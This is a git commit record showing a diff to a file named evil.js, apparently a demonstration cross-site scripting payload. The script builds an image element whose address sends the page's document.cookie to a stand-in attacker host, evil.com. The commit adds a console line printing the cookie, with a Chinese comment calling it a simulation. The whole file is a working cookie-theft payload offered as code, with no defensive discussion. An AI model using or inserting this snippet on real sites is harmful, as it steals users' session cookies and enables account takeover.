db29b8ccfa39f6b5c80ad2ced1225e98a38d8052
Monsieur121 <136728917+Monsieur121@users.noreply.github.com>
2024-05-16 18:41:37 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,3 +1,4 @@
 var img = document.createElement("img");
 img.src = "http://www.evil.com/log?cookie=" + escape(document.cookie);
+console.log("Cookie: " + document.cookie);  // 这是一个模拟，你可以在控制台看到Cookie
 document.body.appendChild(img);
